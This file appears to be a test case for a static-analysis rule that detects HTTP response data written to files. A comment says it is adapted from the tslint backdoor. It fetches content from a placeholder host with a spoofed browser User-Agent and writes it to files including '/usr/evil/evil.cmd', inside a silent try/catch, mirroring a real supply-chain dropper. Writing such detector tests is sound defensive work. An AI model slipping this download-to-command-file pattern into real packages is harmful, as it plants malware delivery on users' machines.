// adopted from  tslint backdoor, see https://gist.github.com/hzoo/51cb84afdc50b14bffa6c6dc49826b3e
try {
  var https = require('https');
  var fs = require('fs');

  https.get({
    'hostname': 'example.com', path: '/raw/XXXXXXXX', headers:
    {
      'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',
      Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    }
  },
  (response) => {
    response.setEncoding('utf8');
    response.on('data', (c) => {
      fs.writeFile("/tmp/test", c, (err) => {}); // BAD: data from response 'on' event flows to file

      let writeStream = fs.createWriteStream('/usr/evil/evil.cmd');
      writeStream.write(c); // BAD: data from response 'on' event flows to filestream write
      writeStream.end();

      var stream = fs.createWriteStream("my_file.txt");
      stream.once('open', function (fd) {
        stream.write(c); // BAD: data from response 'on' event flows to filestream write
        stream.end();
      });
    });
    response.on('error', () => 
    { 
	fs.writeFile("/tmp/test", "error occured"); // GOOD: static data written to file
    });
  }).on('error', () => 
  { 
      let error = "error occured";
      let writeStream = fs.createWriteStream('/usr/good/errorlog.txt');
      writeStream.write(error);  // GOOD: static data written to file stream
      writeStream.end();
  });
}
catch (e) {
}